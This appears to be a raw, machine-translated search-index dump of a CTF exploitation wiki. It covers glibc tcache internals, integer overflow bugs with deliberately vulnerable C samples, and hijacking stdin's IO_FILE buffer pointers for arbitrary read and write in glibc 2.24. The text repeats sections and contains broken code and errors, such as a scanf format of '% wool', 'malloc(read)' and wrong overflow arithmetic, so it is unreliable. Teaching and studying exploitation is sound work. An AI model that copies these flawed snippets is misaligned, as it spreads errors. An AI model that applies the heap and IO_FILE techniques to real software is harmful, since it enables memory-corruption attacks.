there is no tcache if ( SINGLE_THREAD_P ) { victim = _int_malloc ( & main_arena , bytes ); assert ( ! victim || chunk_is_mmapped ( mem2chunk ( victim )) || & main_arena == arena_for_chunk ( mem2chunk ( victim ))); return victim ; } When tcache-&gt;entries is not empty, it will enter the process of tcache_get() to get the chunk. Otherwise, it is similar to the process before the tcache mechanism. Here, the first type of tcache_get() is analyzed. It can also be seen here that tcache has a high priority and is higher than fastbin (the application of fastbin is not in the process of entering tcache). tcache_get() \u00b6 Take a look at tcache_get() source code /* Caller must ensure that we know tc_idx is valid and there's available chunks to remove. */ static __always_inline void * tcache_get ( size_t tc_idx ) { tcache_entry * e = tcache -> entries [ tc_idx ]; assert ( tc_idx < TCACHE_MAX_BINS ); assert ( tcache -> entries [ tc_idx ] > 0 ); tcache -> entries [ tc_idx ] = e -> next ; -- ( tcache -& gt ; counts [ tc_idx ]); // Get a chunk, counts one less return ( void * ) e ; } tcache_get() is the process of getting the chunk. It can be seen that this process is still very simple. Get the first chunk from tcache-&gt;entries[tc_idx] , decrement one by tcache-&gt;counts , and there is almost no protection. __libc_free() \u00b6 After reading the application, look at the release when there is tcache source code void __libc_free ( void * mem ) { ...... ...... MAYBE_INIT_TCACHE (); ar_ptr = arena_for_chunk ( p ); _int_free ( ar_ptr , p , 0 ); } __libc_free() doesn't change much, MAYBE_INIT_TCACHE () has no effect on tcache not empty. _int_free() \u00b6 Follow up _int_free() source code static void _int_free ( mstate av , mchunkptr p , int have_lock ) { ...... ...... #if USE_TCACHE { size_t tc_idx = csize2tidx ( size ); if ( tcache && tc_idx < mp_ . tcache_bins // 64 && tcache -> counts [ tc_idx ] < mp_ . tcache_count ) // 7 { tcache_put ( p , tc_idx ); return ; } } #endif ...... ...... When judging tc_idx is legal, tcache-&gt;counts[tc_idx] is within 7, it enters tcache_put() , the two parameters passed are the chunk to be released and the size corresponding to the chunk in tcache. Standard. tcache_put() \u00b6 source code /* Caller must ensure that we know tc_idx is valid and there's room for more chunks. */ static __always_inline void tcache_put ( mchunkptr chunk , size_t tc_idx ) { tcache_entry * e = ( tcache_entry * ) chunk2mem ( chunk ); assert ( tc_idx < TCACHE_MAX_BINS ); e -> next = tcache -> entries [ tc_idx ]; tcache -> entries [ tc_idx ] = e ; ++ ( tcache -> counts [ tc_idx ]); } tcache_puts() completes the operation of inserting the released chunk into the tcache-&gt;entries[tc_idx] list header with almost no protection. And did not set the p position to zero . Reference \u00b6 http://tukan.farm/2017/07/08/tcache/ https://github.com/bash-c/slides/blob/master/pwn_heap/tcache_exploitation.pdf https://www.secpulse.com/archives/71958.html","title":"Tcache"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#tcache","text":"Tcache is a technique introduced after glibc 2.26 (ubuntu 17.10) (see commit ), the purpose is to improve The performance of heap management. But while improving performance, it has abandoned a lot of security checks, so there are many new ways to use it. > Mainly refer to the glibc source code, angelboy's slide and tukan.farm, the links are all at the end.","title":"tcache"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#related-structure","text":"Tcache introduces two new structures, tcache_entry and tcache_perthread_struct . This is actually very similar to fastbin, but it is different.","title":"Related Structure"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#tcache_entry","text":"source code /* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache. */ typedef struct tcache_entry { struct tcache_entry * next ; } tcache_entry ; tcache_entry is used to link free chunk structures, where the next pointer points to the next chunk of the same size. Note that the next here points to the user data of the chunk, and the fd of the fastbin points to the address at the beginning of the chunk. Moreover, tcache_entry multiplexes the user data portion of the free chunk.","title":"tcache_entry"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#tcache_perthread_struct","text":"source code /* There is one of these for each thread, which contains the per-thread cache (hence \"tcache_perthread_struct\"). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */ typedef struct tcache_perthread_struct { char counts [ TCACHE_MAX_BINS ]; tcache_entry * entries [ TCACHE_MAX_BINS ]; } tcache_perthread_struct ; # define TCACHE_MAX_BINS 64 static __thread tcache_perthread_struct * tcache = NULL ; Each thread maintains a tcache_prethread_struct , which is the management structure of the entire tcache. There are a total of TCACHE_MAX_BINS counters and a TCACHE_MAX_BINS entry tcache_entry. tcache_entry links the same size of free (after free) chunks in a singly linked list, much like fastbin. counts records the number of free chunks in the tcache_entry chain, with up to 7 chunks per chain. The diagram is probably:","title":"tcache_perthread_struct"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#basic-working-methods","text":"The first malloc will first malloc a block of memory for tcache_prethread_struct . free memory, and size is less than small bin size tcache will be placed in fastbin or unsorted bin before after tcache: Put it in the corresponding tcache until tcache is filled (the default is 7) After tcache is filled, the free memory is placed in fastbin or unsorted bin as before. chunks in tcache are not merged (do not cancel inuse bit) malloc memory, and size is in the tcache range First take chunk from tcache until tcache is empty After tcache is empty, look for it from bin When tcache is empty, if there is a chunk with size matching in fastbin/smallbin/unsorted bin , the chunk in fastbin/smallbin/unsorted bin will be put into tcache first until it is full. Then take it from tcache; therefore the order of chunks in bin and tcache will be reversed.","title":"Basic working methods"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#source-analysis","text":"Next, analyze tcache from the perspective of source code.","title":"Source Analysis"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#__libc_malloc","text":"The first time malloc will enter MAYBE_INIT_TCACHE () source code void * __libc_malloc ( size_t bytes ) { ...... ...... #if USE_TCACHE /* int_free also calls request2size, be careful to not pad twice. */ size_t tbytes ; / / Calculate the actual size of the chunk according to the parameters passed in malloc , and calculate the subscript corresponding to tcache checked_request2size ( bytes , tbytes ); size_t tc_idx = csize2tidx ( tbytes ); / / Initialize tcache MAYBE_INIT_TCACHE (); DIAG_PUSH_NEEDS_COMMENT ; If ( tc_idx & lt ; mp_ . tcache_bins // The idx obtained from size is within the legal range /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */ && tcache && tcache -> entries [ tc_idx ] != NULL ) // tcache->entries[tc_idx] \u6709 chunk { return tcache_get ( tc_idx ); } DIAG_POP_NEEDS_COMMENT ; #endif ...... ...... }","title":"__libc_malloc"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#__tcache_init","text":"Where MAYBE_INIT_TCACHE () calls tcache_init() when tcache is empty (that is, the first malloc), and directly looks at tcache_init() source code tcache_init ( void ) { mstate ar_ptr ; void * victim = 0 ; const size_t bytes = sizeof ( tcache_perthread_struct ); if ( tcache_shutting_down ) return ; Arena_get ( ar_ptr , bytes ); // find available arena Victim = _int_malloc ( ar_ptr , bytes ); // Request a chunk of sizeof(tcache_prethread_struct) size if (!victim && ar_ptr != NULL) { ar_ptr = arena_get_retry ( ar_ptr , bytes ); victim = _int_malloc ( ar_ptr , bytes ); } if ( ar_ptr != NULL ) __libc_lock_unlock ( ar_ptr -> mutex ); /* In a low memory situation, we may not be able to allocate memory - in which case, we just keep trying later. However, we typically do this very early, so either there is sufficient memory, or there isn't enough memory to do non-trivial allocations anyway. */ If ( victim ) // initialize tcache { tcache = ( tcache_perthread_struct * ) victim ; memset ( tcache , 0 , sizeof ( tcache_perthread_struct )); } } tcache_init() After successful return, tcache_prethread_struct was successfully created.","title":"__tcache_init ()"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#applying-for-memory","text":"Next, you will enter the steps to apply for memory. // Get memory from tcache list If ( tc_idx & lt ; mp_ . tcache_bins // idx calculated by size is within legal range /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */ && tcache & amp ; & amp ; tcache -& gt ; entries [ tc_idx ] != NULL ) // The tcache chain is not empty { return tcache_get ( tc_idx ); } DIAG_POP_NEEDS_COMMENT ; #endif // Enter a process similar to when there is no tcache if ( SINGLE_THREAD_P ) { victim = _int_malloc ( & main_arena , bytes ); assert ( ! victim || chunk_is_mmapped ( mem2chunk ( victim )) || & main_arena == arena_for_chunk ( mem2chunk ( victim ))); return victim ; } When tcache-&gt;entries is not empty, it will enter the process of tcache_get() to get the chunk. Otherwise, it is similar to the process before the tcache mechanism. Here, the first type of tcache_get() is analyzed. It can also be seen here that tcache has a high priority and is higher than fastbin (the application of fastbin is not in the process of entering tcache).","title":"Applying for memory"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#tcache_get","text":"Take a look at tcache_get() source code /* Caller must ensure that we know tc_idx is valid and there's available chunks to remove. */ static __always_inline void * tcache_get ( size_t tc_idx ) { tcache_entry * e = tcache -> entries [ tc_idx ]; assert ( tc_idx < TCACHE_MAX_BINS ); assert ( tcache -> entries [ tc_idx ] > 0 ); tcache -> entries [ tc_idx ] = e -> next ; -- ( tcache -& gt ; counts [ tc_idx ]); // Get a chunk, counts one less return ( void * ) e ; } tcache_get() is the process of getting the chunk. It can be seen that this process is still very simple. Get the first chunk from tcache-&gt;entries[tc_idx] , decrement one by tcache-&gt;counts , and there is almost no protection.","title":"tcache_get()"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#__libc_free","text":"After reading the application, look at the release when there is tcache source code void __libc_free ( void * mem ) { ...... ...... MAYBE_INIT_TCACHE (); ar_ptr = arena_for_chunk ( p ); _int_free ( ar_ptr , p , 0 ); } __libc_free() doesn't change much, MAYBE_INIT_TCACHE () has no effect on tcache not empty.","title":"__libc_free()"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#_int_free","text":"Follow up _int_free() source code static void _int_free ( mstate av , mchunkptr p , int have_lock ) { ...... ...... #if USE_TCACHE { size_t tc_idx = csize2tidx ( size ); if ( tcache && tc_idx < mp_ . tcache_bins // 64 && tcache -> counts [ tc_idx ] < mp_ . tcache_count ) // 7 { tcache_put ( p , tc_idx ); return ; } } #endif ...... ...... When judging tc_idx is legal, tcache-&gt;counts[tc_idx] is within 7, it enters tcache_put() , the two parameters passed are the chunk to be released and the size corresponding to the chunk in tcache. Standard.","title":"_int_free()"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#tcache_put","text":"source code /* Caller must ensure that we know tc_idx is valid and there's room for more chunks. */ static __always_inline void tcache_put ( mchunkptr chunk , size_t tc_idx ) { tcache_entry * e = ( tcache_entry * ) chunk2mem ( chunk ); assert ( tc_idx < TCACHE_MAX_BINS ); e -> next = tcache -> entries [ tc_idx ]; tcache -> entries [ tc_idx ] = e ; ++ ( tcache -> counts [ tc_idx ]); } tcache_puts() completes the operation of inserting the released chunk into the tcache-&gt;entries[tc_idx] list header with almost no protection. And did not set the p position to zero .","title":"tcache_put()"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#reference","text":"http://tukan.farm/2017/07/08/tcache/ https://github.com/bash-c/slides/blob/master/pwn_heap/tcache_exploitation.pdf https://www.secpulse.com/archives/71958.html","title":"Reference"},{"location":"pwn/linux/integeroverflow/intof/","text":"integer overflow \u00b6 Introduction \u00b6 In C language, the basic data types of integers are divided into short (short), integer (int), and long (long). These three data types are also divided into signed and unsigned, each data type. They all have their own size ranges (because the size range of the data type is determined by the compiler, so the default is to use gcc-5.4 under 64 bits), as shown below: Type Byte Range | short int | 2byte(word) | 0~32767(0~0x7fff) -32768~-1(0x8000~0xffff) | | unsigned short int | 2byte(word) | 0~65535(0~0xffff) | | int | 4byte(dword) | 0~2147483647(0~0x7fffffff) -2147483648~-1(0x80000000~0xffffffff) | | unsigned int | 4byte(dword) | 0~4294967295(0~0xffffffff) | | long int | 8byte(qword) | \u6b63: 0~0x7fffffffffffffff Negative: 0x8000000000000000~0xffffffffffffffff | | unsigned long int | 8byte(qword) | 0~0xffffffffffffffff | When the data in the program exceeds the range of its data type, it will cause an overflow, and the overflow of the integer type is called integer overflow. Principle \u00b6 Next, the principle of integer overflow is briefly explained. Upper bound overflow \u00b6 # Fake code short int a; a = a + 1; # corresponding assembly movzx eax, word ptr [rbp - 0x1c] add eax, 1 mov word ptr [rbp - 0x1c], ax unsigned short int b; b = b + 1; # assembly code add word ptr [rbp - 0x1a], 1 There are two cases of upper bound overflow, one is 0x7fff + 1 and the other is 0xffff + 1 . Because the underlying instructions of the computer are not distinguishable between signed and unsigned, the data exists in binary form (the compiler level distinguishes between signed and unsigned, resulting in different assembly instructions). So add 0x7fff, 1 == 0x8000 , this upper bound overflow has no effect on unsigned integers, but in signed short integers, 0x7fff means 32767 , but 0x8000 It is -32768 , which is represented by a mathematical expression in the signed short integer 32767+1 == -32768 . The second case is add 0xffff, 1 . In this case, the first operand is considered. For example, the assembly code for the signed addition above is add eax, 1 , because eax=0xffff , so add eax, 1 == 0x10000 , but the unsigned assembly code is to add the memory add Word ptr [rbp - 0x1a], 1 == 0x0000 . In the signed addition, although the result of eax is 0x10000, only the value of ax=0x0000 is stored in the memory, and the result is the same as the unsigned. Look at the result of this overflow from the digital level. In the signed short integer, 0xffff==-1, -1 + 1 == 0 , this calculation is no problem from a signed one. But in an unsigned short, 0xffff == 65535, 65535 + 1 == 0 . \u4e0b\u754c\u6ea2 \u00b6 The next overflow is the same as the upper bound overflow. In the assembly code, just replace add with sub . There are two cases as well: The first is sub 0x0000, 1 == 0xffff , which is ok for signed 0 - 1 == -1 , but for unsigned it becomes 0 - 1 == 65535 . The second is sub 0x8000, 1 == 0x7fff , for unsigned it is 32768 - 1 == 32767 is correct, but for signed it becomes -32768 - 1 = 32767 . example \u00b6 In the vulnerability of the integer overflow I have seen, I think it can be summarized in two cases. Unrestricted range \u00b6 This situation is well understood. For example, if you have a fixed-size bucket, pour water into it. If you don't limit how much water is poured, the water will overflow from the bucket. A thing of a fixed size, you do not constrain it, can have unpredictable consequences. Simply write an example: $ cat test . c #include <stddef.h> int main ( void ) { int len ; int data_len ; int header_len ; char * buf ; header_len = 0x10 ; scanf ( & quot ; % wool & quot ;, & amp ; data_len ); len = data_len + header_len buf = malloc ( read ); read ( 0 , buf , data_len ); return 0 ; } $ gcc test . c $ . / a . out -1 asdfasfasdfasdfafasfasfasdfasdf # gdb a.out \u25ba 0x40066d < main + 71 > call malloc @ plt < 0x400500 > size : 0xf Only apply 0x20 size heap, but can input 0xffffffff length data, from integer overflow to heap overflow Wrong type conversion \u00b6 Even if the correct constraints on the variables, there is still the possibility of integer overflow vulnerabilities, I think can be summarized as the wrong type conversion, if you continue to subdivide, you can be divided into: A large range of variables is assigned to a small range of variables $ cat test2 . c void check ( int n ) { if ( ! n ) printf ( \"vuln\" ); else printf ( \"OK\" ); } int main ( void ) { long int a ; scanf ( \"%ld\" , & a ); if ( a == 0 ) printf ( \"Bad\" ); else check ( a ); return 0 ; } $ gcc test2 . c $ . / a . out 4294967296 vuln The above code is a large variable (long integer a), which is a variable with a small range (integer variable n) after passing the check function, causing an integer overflow. The long integer has 8 bytes of memory space, while the integer has only 4 bytes of memory space, so when long -> int, it will cause truncation, and only the low 4 bytes of the long integer will be passed to the integer variable. In the above example, put long: 0x100000000 -&gt; int: 0x00000000 . But when a smaller variable can completely pass the value to a larger variable without causing data loss. Only unilateral restrictions This case is only for signed types $ cat test3 . c int main ( void ) { int len , l ; char buf [ 11 ]; scanf ( & quot ; % d & quot ;, & amp ; len ); if ( len & lt ; 10 ) { l = read ( 0 , buf , len ); * ( buf + l ) = 0 ; puts ( buf ); } else printf ( \"Please len < 10\" ); } $ gcc test3 . c $ . / a . out -1 aaaaaaaaaaaa aaaaaaaaaaaa On the surface, we have limited the variable len, but if you think about it, you can see that len is a signed integer, so the length of len can be negative, but in the read function, the type of the third parameter is size_t , the type is equivalent to unsigned long int , which is an unsigned long integer The two cases in the above example have a commonality, that is, the formal parameters of the function and the types of the actual parameters are different, so I think it can be summarized as the wrong type conversion. CTF example \u00b6 Title: [Pwnhub Story's Beginning Cal] ( http://atum.li/2016/12/05/calc/ )","title":"Introduction to The Principle of Integer Overflow"},{"location":"pwn/linux/integeroverflow/intof/#integer-overflow","text":"","title":"integer overflow"},{"location":"pwn/linux/integeroverflow/intof/#introduction","text":"In C language, the basic data types of integers are divided into short (short), integer (int), and long (long). These three data types are also divided into signed and unsigned, each data type. They all have their own size ranges (because the size range of the data type is determined by the compiler, so the default is to use gcc-5.4 under 64 bits), as shown below: Type Byte Range | short int | 2byte(word) | 0~32767(0~0x7fff) -32768~-1(0x8000~0xffff) | | unsigned short int | 2byte(word) | 0~65535(0~0xffff) | | int | 4byte(dword) | 0~2147483647(0~0x7fffffff) -2147483648~-1(0x80000000~0xffffffff) | | unsigned int | 4byte(dword) | 0~4294967295(0~0xffffffff) | | long int | 8byte(qword) | \u6b63: 0~0x7fffffffffffffff Negative: 0x8000000000000000~0xffffffffffffffff | | unsigned long int | 8byte(qword) | 0~0xffffffffffffffff | When the data in the program exceeds the range of its data type, it will cause an overflow, and the overflow of the integer type is called integer overflow.","title":"Introduction"},{"location":"pwn/linux/integeroverflow/intof/#principle","text":"Next, the principle of integer overflow is briefly explained.","title":"Principle"},{"location":"pwn/linux/integeroverflow/intof/#upper-bound-overflow","text":"# Fake code short int a; a = a + 1; # corresponding assembly movzx eax, word ptr [rbp - 0x1c] add eax, 1 mov word ptr [rbp - 0x1c], ax unsigned short int b; b = b + 1; # assembly code add word ptr [rbp - 0x1a], 1 There are two cases of upper bound overflow, one is 0x7fff + 1 and the other is 0xffff + 1 . Because the underlying instructions of the computer are not distinguishable between signed and unsigned, the data exists in binary form (the compiler level distinguishes between signed and unsigned, resulting in different assembly instructions). So add 0x7fff, 1 == 0x8000 , this upper bound overflow has no effect on unsigned integers, but in signed short integers, 0x7fff means 32767 , but 0x8000 It is -32768 , which is represented by a mathematical expression in the signed short integer 32767+1 == -32768 . The second case is add 0xffff, 1 . In this case, the first operand is considered. For example, the assembly code for the signed addition above is add eax, 1 , because eax=0xffff , so add eax, 1 == 0x10000 , but the unsigned assembly code is to add the memory add Word ptr [rbp - 0x1a], 1 == 0x0000 . In the signed addition, although the result of eax is 0x10000, only the value of ax=0x0000 is stored in the memory, and the result is the same as the unsigned. Look at the result of this overflow from the digital level. In the signed short integer, 0xffff==-1, -1 + 1 == 0 , this calculation is no problem from a signed one. But in an unsigned short, 0xffff == 65535, 65535 + 1 == 0 .","title":"Upper bound overflow"},{"location":"pwn/linux/integeroverflow/intof/#_1","text":"The next overflow is the same as the upper bound overflow. In the assembly code, just replace add with sub . There are two cases as well: The first is sub 0x0000, 1 == 0xffff , which is ok for signed 0 - 1 == -1 , but for unsigned it becomes 0 - 1 == 65535 . The second is sub 0x8000, 1 == 0x7fff , for unsigned it is 32768 - 1 == 32767 is correct, but for signed it becomes -32768 - 1 = 32767 .","title":"\u4e0b\u754c\u6ea2"},{"location":"pwn/linux/integeroverflow/intof/#example","text":"In the vulnerability of the integer overflow I have seen, I think it can be summarized in two cases.","title":"example"},{"location":"pwn/linux/integeroverflow/intof/#unrestricted-range","text":"This situation is well understood. For example, if you have a fixed-size bucket, pour water into it. If you don't limit how much water is poured, the water will overflow from the bucket. A thing of a fixed size, you do not constrain it, can have unpredictable consequences. Simply write an example: $ cat test . c #include <stddef.h> int main ( void ) { int len ; int data_len ; int header_len ; char * buf ; header_len = 0x10 ; scanf ( & quot ; % wool & quot ;, & amp ; data_len ); len = data_len + header_len buf = malloc ( read ); read ( 0 , buf , data_len ); return 0 ; } $ gcc test . c $ . / a . out -1 asdfasfasdfasdfafasfasfasdfasdf # gdb a.out \u25ba 0x40066d < main + 71 > call malloc @ plt < 0x400500 > size : 0xf Only apply 0x20 size heap, but can input 0xffffffff length data, from integer overflow to heap overflow","title":"Unrestricted range"},{"location":"pwn/linux/integeroverflow/intof/#wrong-type-conversion","text":"Even if the correct constraints on the variables, there is still the possibility of integer overflow vulnerabilities, I think can be summarized as the wrong type conversion, if you continue to subdivide, you can be divided into: A large range of variables is assigned to a small range of variables $ cat test2 . c void check ( int n ) { if ( ! n ) printf ( \"vuln\" ); else printf ( \"OK\" ); } int main ( void ) { long int a ; scanf ( \"%ld\" , & a ); if ( a == 0 ) printf ( \"Bad\" ); else check ( a ); return 0 ; } $ gcc test2 . c $ . / a . out 4294967296 vuln The above code is a large variable (long integer a), which is a variable with a small range (integer variable n) after passing the check function, causing an integer overflow. The long integer has 8 bytes of memory space, while the integer has only 4 bytes of memory space, so when long -> int, it will cause truncation, and only the low 4 bytes of the long integer will be passed to the integer variable. In the above example, put long: 0x100000000 -&gt; int: 0x00000000 . But when a smaller variable can completely pass the value to a larger variable without causing data loss. Only unilateral restrictions This case is only for signed types $ cat test3 . c int main ( void ) { int len , l ; char buf [ 11 ]; scanf ( & quot ; % d & quot ;, & amp ; len ); if ( len & lt ; 10 ) { l = read ( 0 , buf , len ); * ( buf + l ) = 0 ; puts ( buf ); } else printf ( \"Please len < 10\" ); } $ gcc test3 . c $ . / a . out -1 aaaaaaaaaaaa aaaaaaaaaaaa On the surface, we have limited the variable len, but if you think about it, you can see that len is a signed integer, so the length of len can be negative, but in the read function, the type of the third parameter is size_t , the type is equivalent to unsigned long int , which is an unsigned long integer The two cases in the above example have a commonality, that is, the formal parameters of the function and the types of the actual parameters are different, so I think it can be summarized as the wrong type conversion.","title":"Wrong type conversion"},{"location":"pwn/linux/integeroverflow/intof/#ctf-example","text":"Title: [Pwnhub Story's Beginning Cal] ( http://atum.li/2016/12/05/calc/ )","title":"CTF example"},{"location":"pwn/linux/io_file/exploit-in-libc2.24/","text":"glibc 2.24 Utilization of IO_FILE \u00b6 Introduction \u00b6 In the 2.24 version of glibc, the new detection of vtable hijacking for IO_FILE_plus, glibc The validity of the vtable address is checked first before calling the virtual function. First, it will verify whether the vtable is in the _IO_vtable section. If the condition is met, it will be executed normally. Otherwise, _IO_vtable_check will be called for further checking. /* Check if unknown vtable pointers are permitted; otherwise, terminate the process. */ void _IO_vtable_check ( void ) attribute_hidden ; /* Perform vtable pointer validation. If validation fails, terminate the process. */ static inline const struct _IO_jump_t * IO_validate_vtable ( const struct _IO_jump_t * vtable ) { /* Fast path: The vtable pointer is within the __libc_IO_vtables section. */ uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables ; uintptr_t ptr = ( uintptr_t ) vtable ; uintptr_t offset = ptr - ( uintptr_t ) __start___libc_IO_vtables ; if ( __glibc_unlikely ( offset >= section_length )) /* The vtable pointer is not in the expected section. Use the slow path, which will terminate the process if necessary. */ _IO_vtable_check (); return vtable ; } Calculate section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; , and then determine the offset of vtable - __start___libc_IO_vtables. If the offset is greater than section_length, ie greater than __stop___libc_IO_vtables - __start___libc_IO_vtables then the _IO_vtable_check() function will be called. void attribute_hidden _IO_vtable_check ( void ) { #ifdef SHARED /* Honor the compatibility flag. */ void ( * flag ) ( void ) = atomic_load_relaxed ( & IO_accept_foreign_vtables ); #ifdef PTR_DEMANGLE PTR_DEMANGLE ( flag ); #endif if ( flag == & _IO_vtable_check ) return ; /* In case this libc copy is in a non-default namespace, we always need to accept foreign vtables because there is always a possibility that FILE * objects are passed across the linking boundary. */ { Dl_info di ; struct link_map * l ; if ( _dl_open_hook != NULL || ( _dl_addr ( _IO_vtable_check , & amp ; di , & amp ; l , NULL ) ! = 0 && l -> l_ns != LM_ID_BASE )) return ; } #else /* !SHARED */ /* We cannot perform vtable validation in the static dlopen case because FILE * handles might be passed back and forth across the boundary. Therefore, we disable checking in this case. */ if ( __dlopen != NULL ) return ; #endif __libc_fatal ( \"Fatal error: glibc detected an invalid stdio handle \\n \" ); } If the vtable is illegal, then abort is raised. The check here makes it difficult to implement the technology that used vtable in the past. New utilization technology \u00b6 fileno Use of buffers \u00b6 After the vtable is difficult to exploit, the focus of interest is transferred from the vtable to the domain inside the _IO_FILE structure. As mentioned earlier, _IO_FILE is created and responsible for maintaining some related information when using the standard IO library. Some of the fields are used to write addresses or read addresses when calling functions such as fwrite and fread. If you can control these data, Any address write or arbitrary address read can be implemented. struct _IO_FILE { int _flags; /* High-order word is _IO_MAGIC; rest is flags. */ /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; int _flags2; _IO_off_t _old_offset; /* This used to be _offset but it's too small. */ }; Because the process contains the system default three file streams stdin\\stdout\\stderr, this method can not use the file operation in the process, and can be used by scanf\\printf. In _IO_FILE, _IO_buf_base indicates the start address of the operation, and _IO_buf_end indicates the end address. By controlling these two data, the operation of controlling read and write can be realized. Example \u00b6 Simply observe the effect of _IO_FILE on calling scanf #include \"stdio.h\" char buf[100]; int main() { char stack_buf[100]; scanf(\"%s\",stack_buf); scanf(\"%s\",stack_buf); } The content of stdin has not been initialized until the first time the executable is used. 0x7ffff7dd18e0 <_IO_2_1_stdin_>: 0x00000000fbad2088 0x0000000000000000 0x7ffff7dd18f0 <_IO_2_1_stdin_+16>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1900 <_IO_2_1_stdin_+32>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1910 <_IO_2_1_stdin_+48>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1920 <_IO_2_1_stdin_+64>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1930 <_IO_2_1_stdin_+80>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1940 <_IO_2_1_stdin_+96>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1950 <_IO_2_1_stdin_+112>: 0x0000000000000000 0xffffffffffffffff 0x7ffff7dd1960 <_IO_2_1_stdin_+128>: 0x0000000000000000 0x00007ffff7dd3790 0x7ffff7dd1970 <_IO_2_1_stdin_+144>: 0xffffffffffffffff 0x0000000000000000 0x7ffff7dd1980 <_IO_2_1_stdin_+160>: 0x00007ffff7dd19c0 0x0000000000000000 0x7ffff7dd1990 <_IO_2_1_stdin_+176>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19a0 <_IO_2_1_stdin_+192>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19b0 <_IO_2_1_stdin_+208>: 0x0000000000000000 0x00007ffff7dd06e0 <== vtable After calling scanf, you can see that the fields _IO_read_ptr, _IO_read_base, _IO_read_end, _IO_buf_base, _IO_buf_end are initialized. 0x7ffff7dd18e0 <_IO_2_1_stdin_>: 0x00000000fbad2288 0x0000000000602013 0x7ffff7dd18f0 <_IO_2_1_stdin_+16>: 0x0000000000602014 0x0000000000602010 0x7ffff7dd1900 <_IO_2_1_stdin_+32>: 0x0000000000602010 0x0000000000602010 0x7ffff7dd1910 <_IO_2_1_stdin_+48>: 0x0000000000602010 0x0000000000602010 0x7ffff7dd1920 <_IO_2_1_stdin_+64>: 0x0000000000602410 0x0000000000000000 0x7ffff7dd1930 <_IO_2_1_stdin_+80>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1940 <_IO_2_1_stdin_+96>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1950 <_IO_2_1_stdin_+112>: 0x0000000000000000 0xffffffffffffffff 0x7ffff7dd1960 <_IO_2_1_stdin_+128>: 0x0000000000000000 0x00007ffff7dd3790 0x7ffff7dd1970 <_IO_2_1_stdin_+144>: 0xffffffffffffffff 0x0000000000000000 0x7ffff7dd1980 <_IO_2_1_stdin_+160>: 0x00007ffff7dd19c0 0x0000000000000000 0x7ffff7dd1990 <_IO_2_1_stdin_+176>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19a0 <_IO_2_1_stdin_+192>: 0x00000000ffffffff 0x0000000000000000 0x7ffff7dd19b0 <_IO_2_1_stdin_+208>: 0x0000000000000000 0x00007ffff7dd06e0 Further thinking can be found that the memory initialized by stdin is actually allocated on the heap. The base address of the heap here is 0x602000, because there is no heap allocation before, so the address of the buffer is also 0x602010. Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 rx /home/vb/desktop/tst/1/t1 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/desktop/tst/1/t1 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/desktop/tst/1/t1 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] The allocated heap size is 0x400 bytes, which corresponds to _IO_buf_base~_IO_buf_end After writing, you can see that we have written data in the buffer, and then the buffer in the destination address stack will also write data. 0x602000: 0x0000000000000000 0x0000000000000411 &lt;== allocate 0x400 size 0x602010: 0x000000000a333231 0x0000000000000000 &lt;== buffering data 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 Next we try to modify _IO_buf_base to achieve arbitrary address reading and writing, the address of the global buffer buf is 0x7ffff7dd2740. Modify _IO_buf_base and _IO_buf_end to the address of buffer buf 0x7ffff7dd18e0 <_IO_2_1_stdin_>: 0x00000000fbad2288 0x0000000000602013 0x7ffff7dd18f0 <_IO_2_1_stdin_+16>: 0x0000000000602014 0x0000000000602010 0x7ffff7dd1900 <_IO_2_1_stdin_+32>: 0x0000000000602010 0x0000000000602010 0x7ffff7dd1910 &lt;_IO_2_1_stdin_ + 48&gt;: 0x0000000000602010 0x00007ffff7dd2740 &lt;== _IO_buf_base 0x7ffff7dd1920 <_IO_2_1_stdin_+64>: 0x00007ffff7dd27c0 0x0000000000000000 <== _IO_buf_end 0x7ffff7dd1930 <_IO_2_1_stdin_+80>: 0x0000000000000000 0x0000000000000000 